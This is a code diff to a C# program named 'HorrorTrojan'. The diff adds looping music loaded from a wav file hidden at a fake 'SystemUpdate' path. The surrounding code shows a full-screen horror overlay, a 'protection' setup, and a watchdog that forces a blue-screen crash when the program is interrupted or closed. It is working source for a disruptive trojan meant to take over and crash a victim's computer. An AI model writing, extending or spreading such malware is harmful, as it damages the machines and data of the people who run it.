@@ -1,6 +1,7 @@
 using System;
 using System.Drawing;
 using System.Drawing.Drawing2D;
+using System.Media;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -34,6 +35,8 @@ namespace HorrorTrojan
         private Thread watchdogThread;
         private bool watchdogAlive = true;
         private DateTime lastPing = DateTime.Now;
+        private SoundPlayer musicPlayer;
+        private string musicPath = @"C:\Windows\ProgramFiles\SystemUpdate\hr.wav";
         
         public HorrorForm()
         {
@@ -44,6 +47,20 @@ namespace HorrorTrojan
             this.SetStyle(ControlStyles.AllPaintingInWmPaint | ControlStyles.UserPaint | ControlStyles.Opaque, true);
             
             gdiOverlay = new GDIOverlay();
+            InitializeMusic();
+        }
+        
+        private void InitializeMusic()
+        {
+            try
+            {
+                if (System.IO.File.Exists(musicPath))
+                {
+                    musicPlayer = new SoundPlayer(musicPath);
+                    musicPlayer.Load();
+                }
+            }
+            catch { }
         }
         
         private void InitializeComponent()
@@ -108,7 +125,33 @@ namespace HorrorTrojan
             gdiOverlay.Start();
             protectTimer.Start();
             
+            PlayMusic();
+            
             SetupFullProtection();
+        }
+        
+        private void PlayMusic()
+        {
+            try
+            {
+                if (musicPlayer != null)
+                {
+                    musicPlayer.PlayLooping();
+                }
+            }
+            catch { }
+        }
+        
+        private void StopMusic()
+        {
+            try
+            {
+                if (musicPlayer != null)
+                {
+                    musicPlayer.Stop();
+                }
+            }
+            catch { }
         }
         
         private void SetupFullProtection()
@@ -133,12 +176,14 @@ namespace HorrorTrojan
                 {
                     if ((DateTime.Now - lastPing).TotalSeconds > 2)
                     {
+                        StopMusic();
                         BSODTrigger.TriggerBSOD();
                         return;
                     }
                 }
                 catch
                 {
+                    StopMusic();
                     BSODTrigger.TriggerBSOD();
                     return;
                 }
@@ -155,6 +200,7 @@ namespace HorrorTrojan
             }
             catch
             {
+                StopMusic();
                 BSODTrigger.TriggerBSOD();
             }
             
@@ -179,6 +225,7 @@ namespace HorrorTrojan
                 gdiOverlay.Stop();
                 protectTimer.Stop();
                 watchdogAlive = false;
+                StopMusic();
                 BSODTrigger.TriggerBSOD();
             }
         }
@@ -331,6 +378,7 @@ namespace HorrorTrojan
                 protectTimer?.Dispose();
                 gdiOverlay?.Dispose();
                 horrorImage?.Dispose();
+                musicPlayer?.Dispose();
                 watchdogAlive = false;
             }
             base.Dispose(disposing);
